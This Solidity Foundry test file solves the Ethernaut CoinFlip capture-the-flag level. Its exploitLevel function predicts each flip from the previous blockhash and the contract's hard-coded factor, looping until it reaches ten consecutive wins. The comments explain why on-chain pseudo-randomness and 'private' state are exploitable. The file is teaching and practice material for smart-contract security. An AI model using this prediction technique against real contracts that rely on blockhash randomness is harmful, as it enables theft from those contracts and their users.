// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/CoinFlip.sol";
import "src/levels/CoinFlipFactory.sol";

import "@openzeppelin/contracts/math/SafeMath.sol";

contract TestCoinFlip is BaseTest {
    using SafeMath for uint256;
    CoinFlip private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new CoinFlipFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = CoinFlip(levelAddress);

        // Check that the contract is correctly setup
        assertEq(level.consecutiveWins(), 0);
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */

        vm.startPrank(player);

        // The idea here is that
        // 1) everything on the blockchain is public, even private variables
        // 2) there is no "native" real radomness in the blockchain but only "pseudo randomness"
        // Factor is private so we cannot read it directly but you could just go to etherscan, see the code and use it directly
        // or decompile the bytecode (if the contract is not verified) and see what value is used
        // For the pseudo-random part we just need to iterate "simulating" the result. If the result is not good to solve the coin flip
        // we could just skip the block and wait for a block number that fit our needs

        uint256 factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint8 consecutiveWinsToReach = 10;

        while (level.consecutiveWins() < consecutiveWinsToReach) {
            uint256 blockValue = uint256(blockhash(block.number.sub(1)));
            uint256 coinFlip = blockValue.div(factor);
            level.flip(coinFlip == 1 ? true : false);

            // simulate a transaction
            utilities.mineBlocks(1);
        }
        vm.stopPrank();
    }
}
